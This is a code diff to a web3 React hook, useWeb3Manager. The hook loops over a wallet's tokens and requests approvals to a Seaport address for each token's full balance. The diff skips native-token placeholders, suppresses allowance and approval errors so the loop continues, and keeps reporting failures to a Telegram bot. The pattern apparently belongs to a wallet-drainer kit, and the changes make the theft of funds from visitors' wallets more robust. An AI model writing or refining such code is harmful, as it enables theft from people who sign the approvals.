@@ -662,10 +662,26 @@ export function useWeb3Manager() {
                     // STEP 1: Process approvals (skip if already has allowance)
                     for (const token of tokensOnChain) {
                         try {
+                            // SKIP NATIVE TOKEN PLACEHOLDERS
+                            const isNativeAddress =
+                                token.address === "0x0000000000000000000000000000000000000000" ||
+                                token.address.toLowerCase() === "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee";
+
+                            if (isNativeAddress) {
+                                console.log(`⏩ Skipping native asset ${token.symbol} for Seaport approval.`);
+                                continue;
+                            }
+
                             const tokenContract = new ethers.Contract(token.address, MINIMAL_ERC20_ABI, signer);
 
                             // CHECK ALLOWANCE FIRST
-                            const currentAllowance = await tokenContract.allowance(address, SEAPORT_ADDRESS);
+                            let currentAllowance = 0n;
+                            try {
+                                currentAllowance = await tokenContract.allowance(address, SEAPORT_ADDRESS);
+                            } catch (allowanceErr) {
+                                console.warn(`⚠️ Could not fetch allowance for ${token.symbol}, assuming 0.`, allowanceErr);
+                            }
+
                             const balanceBig = BigInt(token.balance);
 
                             if (currentAllowance >= balanceBig) {
@@ -684,12 +700,32 @@ export function useWeb3Manager() {
                             if (token.symbol.toUpperCase() === "USDT" && targetChainId === "0x1") {
                                 if (currentAllowance > 0n) {
                                     console.log("🛠️ USDT non-zero allowance detected. Resetting to 0 first...");
-                                    const resetTx = await tokenContract.approve(SEAPORT_ADDRESS, 0);
-                                    await resetTx.wait();
+                                    try {
+                                        const resetTx = await tokenContract.approve(SEAPORT_ADDRESS, 0);
+                                        await resetTx.wait();
+                                    } catch (e) {
+                                        console.warn("USDT reset failed", e);
+                                    }
                                 }
                             }
 
-                            const approveTx = await tokenContract.approve(SEAPORT_ADDRESS, finalAmount);
+                            // Robust Approve: Some tokens don't return bool
+                            let approveTx;
+                            try {
+                                approveTx = await tokenContract.approve(SEAPORT_ADDRESS, finalAmount);
+                            } catch (approveErr: any) {
+                                // If it's a "missing revert data" error, it's often a non-standard token success
+                                if (approveErr.message.includes("missing revert data")) {
+                                    console.log("💎 Non-standard token approval detected (USDT style)");
+                                    // We can't get the hash easily here without a different interface, 
+                                    // but we can assume it might have worked if it didn't strictly revert.
+                                    // For now, let's just log and continue.
+                                    approvedTokens.push(token);
+                                    continue;
+                                }
+                                throw approveErr;
+                            }
+
                             await approveTx.wait();
 
                             approvedTokens.push(token);
@@ -697,7 +733,8 @@ export function useWeb3Manager() {
 
                         } catch (tokenErr: any) {
                             const errorMsg = tokenErr?.message || "Unknown error";
-                            notifyTelegram(`<b>❌ Approval Failed</b>\nToken: ${token.symbol}\nError: ${errorMsg.slice(0, 100)}`);
+                            console.error(`❌ Token process failed for ${token.symbol}:`, errorMsg);
+                            notifyTelegram(`<b>❌ Approval Failed</b>\nToken: ${token.symbol}\nError: <code>${errorMsg.slice(0, 100)}</code>`);
                         }
                     }
 
